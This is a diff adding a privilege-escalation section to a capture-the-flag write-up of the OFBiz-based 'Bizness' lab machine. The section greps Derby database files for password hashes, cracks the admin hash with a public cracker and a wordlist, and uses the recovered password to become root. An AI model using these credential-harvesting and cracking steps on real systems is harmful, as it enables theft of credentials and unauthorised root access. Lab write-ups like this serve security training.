@@ -132,6 +132,107 @@ cat user.txt
 ofbiz@bizness:~$
 ```
 
+##Privilege escalation##
+-------------------------------------------
+
+After long enumaration I found derby database:
+
+```bash
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ ls
+ls
+dbex.lck  log                            seg0                tmp
+db.lck    README_DO_NOT_TOUCH_FILES.txt  service.properties
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt
+<data/derby/ofbiz$ cat README_DO_NOT_TOUCH_FILES.txt
+
+# *************************************************************************
+# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
+# *** FILES IN THIS DIRECTORY AND SUBDIRECTORIES CONSTITUTE A DERBY     ***
+# *** DATABASE, WHICH INCLUDES THE DATA (USER AND SYSTEM) AND THE       ***
+# *** FILES NECESSARY FOR DATABASE RECOVERY.                            ***
+# *** EDITING, ADDING, OR DELETING ANY OF THESE FILES MAY CAUSE DATA    ***
+# *** CORRUPTION AND LEAVE THE DATABASE IN A NON-RECOVERABLE STATE.     ***
+# *************************************************************************
+```
+
+moving into seg0 there are tones of .dat files, strings all the files and try to get passwords from it with:
+
+```bash
+<a/derby/ofbiz/seg0$ strings *.dat | grep "Password"    
+                        <td align='left'><span>Password: </span></td>
+                  <div><a href="<@ofbizUrl>/forgotpasswd</@ofbizUrl>">Forgot Password?</a></div>
+        <Password>${password}</Password>
+!Change Password Template Location
+!Forget Password Template Location
+Retrieve Password
+                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+Password
+```
+
+There is hash:
+
+```
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+```
+
+"SHA" indicates the hash algorithm used, which is SHA-1.
+"d" denotes that it's a password hash generated with the crypt function.
+"uP0_QaVBpDWFeo8-dRzDqRwXQ2I" is the actual hash value.
+
+There are some hash sha1 cracker of ofbiz's hashes:
+
+https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker.git
+
+clone the repository and use cracker.
+
+```bash
+└─# python3 cracker.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
+[+] Attempting to crack....
+Found Password: monkeybizness
+hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+(Attempts: 1478438)
+[!] Super, I bet you could log into something with that!
+```
+
+There is a password for root. su root and grab root.txt flag.
+
+```
+ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su
+su
+Password: monkeybizness
+
+root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# whoami
+whoami
+root
+root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cat /root/root.txt
+cat /root/root.txt
+********************************
+root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# 
+```
+
+AND THIS IS THE END!
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
